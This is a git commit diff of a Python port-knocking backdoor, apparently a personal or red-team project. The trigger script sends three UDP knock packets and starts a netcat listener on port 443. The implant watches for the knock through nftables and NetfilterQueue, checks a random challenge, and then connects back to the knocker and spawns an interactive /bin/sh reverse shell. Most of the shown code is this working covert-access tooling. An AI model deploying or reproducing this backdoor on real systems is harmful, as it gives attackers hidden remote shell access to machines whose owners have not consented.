fb5bf0b9d496cd127fd2f32f472383e5fcb6fdcb
noop <91637660+0x90pkt@users.noreply.github.com>
2024-11-13 19:47:02 -0500

    Fixed venv and tested successfully without hardcoded source ip.

--- tested/send_trigger_test.py
+++ tested/send_trigger_test.py
@@ -3,9 +3,13 @@ from scapy.all import *
 import os
 import subprocess
 import sys
+import platform
+import time
+import random
+
 
 dest_ip = sys.argv[1]
-#dest_ip = "127.0.0.1"
+# dest_ip = "127.0.0.1"
 dest_port1 = 40296
 dest_port2 = 29640
 dest_port3 = 64920
@@ -29,10 +33,10 @@ def listen():
 
 def send_trigger1():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = "empty"
+    message = ""
     try:
-        sock.sendto(message.encode(), (dest_ip, dest_port1))
         print(f"Sending first trigger packet to {dest_ip} on port {dest_port1}")
+        sock.sendto(message.encode(), (dest_ip, dest_port1))
     finally:
         sock.close()
 
@@ -41,43 +45,68 @@ def send_trigger2():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     message = "empty"
     try:
-        sock.sendto(message.encode(), (dest_ip, dest_port2))
         print(f"Sending second trigger packet to {dest_ip} on port {dest_port2}")
+        sock.sendto(message.encode(), (dest_ip, dest_port2))
     finally:
         sock.close()
 
 
 def send_trigger3(message):
-    pkt = IP(dst=dest_ip)/UDP(dport=dest_port3)/message
-    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #print(message)
-    #pkt.show()
+    pkt = IP(dst=dest_ip) / UDP(dport=dest_port3) / message
+    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # print(message)
+    # pkt.show()
     try:
-        send(pkt)
-        #sock.sendto(message.encode(), (dest_ip, dest_port3))
         print(f"Sending last trigger packet to {dest_ip} on port {dest_port3}")
+        send(pkt)
+        # sock.sendto(message.encode(), (dest_ip, dest_port3))
     finally:
-        #sock.close()
+        # sock.close()
         print("All triggers sent...\n")
-        
+
 
 def catch_shell():
-	print("Setting up handler to catch callback...\n")
-	subprocess.run(["nc", "-nlvp", "443"]) 
+    if os.name == 'posix':
+        print("OS is posix...", end='')
+        time.sleep(0.5)
+        flavor = platform.system()
+        print(f"and {flavor}...", end='')
+        time.sleep(1)
+        print("good, we can work with that.\n\nSetting up handler to catch callback...\n")
+        if flavor.casefold() == 'Linux'.casefold():
+            try:
+                subprocess.run(["nc", "-nlvp", "443"])
+            except Exception as e:
+                print(f"ERROR: Failed to establish listener: {e}")
+                exit(1)
+        elif flavor.casefold() == 'Darwin'.casefold():
+            try:
+                subprocess.run(["nc", "-nlv", "443"])
+            except Exception as e:
+                print(f"ERROR: Failed to establish listener: {e}")
+                exit(1)
+        elif flavor.casefold() == 'Windows'.casefold():
+            print("I didn't even think this would get this far on Windows...let's try...\n")
+            try:
+                subprocess.run(["nc", "-nvp", "443"])
+            except Exception as e:
+                print(f"Oh look, it didn't work -- {e}")
+                exit(1)
 
 
 def main():
     print("Beginning trigger sequence...\n")
     try:
-    	send_trigger1()
-    	send_trigger2()
-    	message = listen()
-    	send_trigger3(message)
-    	catch_shell()
+        send_trigger1()
+        send_trigger2()
+        message = listen()
+        send_trigger3(message)
+        catch_shell()
     except KeyboardInterrupt:
         print('')
-    
+
     exit(0)
+
 
 if __name__ == "__main__":
     main()
--- tested/triggertest.py
+++ tested/triggertest.py
@@ -93,6 +93,7 @@ def search_rules_with_counter(data_structure: dict):
 
     return ret
 
+
 def knock_and_respond(packet):
     print(f"packet info: {packet}")
     ogpkt = packet.get_payload()
@@ -100,10 +101,10 @@ def knock_and_respond(packet):
     pktid = packet.id
     print(f"packet id = {pktid}\nmark: {mark}\n")
     pkt = IP(packet.get_payload())
-    #print(f"after conversion: {pkt}\n\n")
+    # print(f"after conversion: {pkt}\n\n")
     pktenc = str.encode(str(pkt))
     packet.set_payload(pktenc)
-    #print(f"byte type: {pktenc}\n\n")
+    # print(f"byte type: {pktenc}\n\n")
     global ip_src
     if IP in pkt:
         ip_src = pkt[IP].src
@@ -112,46 +113,46 @@ def knock_and_respond(packet):
     print(f'Source IP: {ip_src}\n'
           f'Destination Port: {dst_port}\n\n')
     if UDP in pkt and dst_port == 29640:
-    	global message
-    	send_port = 46290
-    	get_rand = random.randint(1, 65535)
-    	message = str(get_rand)
-    	#print(f"message: {message}\n")
-    	try:
-        	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
-        	sock.sendto(message.encode(), (ip_src, send_port))
-        	print("[*]Confirmation Packet sent.")
-        	sock.close()
-    	except Exception as e:
-        	print(f"ERROR: failed to sent packet: {e}")
-        	exit(1)
+        global message
+        send_port = 46290
+        get_rand = random.randint(1, 65535)
+        message = str(get_rand)
+        # print(f"message: {message}\n")
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
+            sock.sendto(message.encode(), (ip_src, send_port))
+            print("[*]Confirmation Packet sent.")
+            sock.close()
+        except Exception as e:
+            print(f"ERROR: failed to sent packet: {e}")
+            exit(1)
     if IP in pkt and dst_port == 64920:
-    	data = bytes(pkt[UDP].payload).decode('UTF8','replace')
-    	print(data)
-    	print("Verifying connection...\n")
-    	criteria = message
-    	match = re.search(criteria, data)
-    	if match:
-        	print(f"Messages match: {message} \nConnection confirmed!\nSending shell!")
-        	send_shell()
-    	else:
-        	print("Messages don't match. Not sending shell.")
-        	exit(1)
+        data = bytes(pkt[UDP].payload).decode('UTF8', 'replace')
+        print(data)
+        print("Verifying connection...\n")
+        criteria = message
+        match = re.search(criteria, data)
+        if match:
+            print(f"Messages match: {message} \nConnection confirmed!\nSending shell!")
+            send_shell()
+        else:
+            print("Messages don't match. Not sending shell.")
+            exit(1)
     packet.drop()
-    #knock2_and_shell(packet)
+    # knock2_and_shell(packet)
     return int(message)
 
 
 def send_shell():
     global ip_src
-    time.sleep(3)
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_src,443))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    subprocess.call(["/bin/sh","-i"])
-    
+    time.sleep(5)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip_src, 443))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
+
 
 def delete_rules(nft):
     # get the ruleset from the kernel, im JSON format and search for
@@ -187,7 +188,8 @@ def delete_rules(nft):
 # read in rules to listen for trigger packets
 NFTABLES_RULESET_JSON = add_rules()
 message = 0
-ip_src= ""
+ip_src = ""
+
 
 def main():
     nft = nftables.Nftables()
@@ -195,26 +197,25 @@ def main():
     nft.set_handle_output(True)  # important! to get the rule handle when getting the ruleset
     # load the ruleset in JSON format into the kernel
     # see other examples in this tutorial to know more about how this works
-    #load_ruleset(nft)
+    # load_ruleset(nft)
 
     nfqueue = NetfilterQueue()
-    
-    
-    i = 0 
+
+    i = 0
 
     try:
-    	nfqueue.bind(2, knock_and_respond)
-    	nfqueue.run()
-    	print(message)
-    	#nfqueue.unbind()
-    	#nfqueue.run(False)
-    	#nfqueue.bind(3, knock2_and_shell)
-    	#nfqueue.run()
+        nfqueue.bind(2, knock_and_respond)
+        nfqueue.run()
+        print(message)
+        # nfqueue.unbind()
+        # nfqueue.run(False)
+        # nfqueue.bind(3, knock2_and_shell)
+        # nfqueue.run()
     except KeyboardInterrupt:
         print('')
 
     nfqueue.unbind()
-    #delete_rules(nft)
+    # delete_rules(nft)
 
     # ok!
     exit(0)
@@ -222,4 +223,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
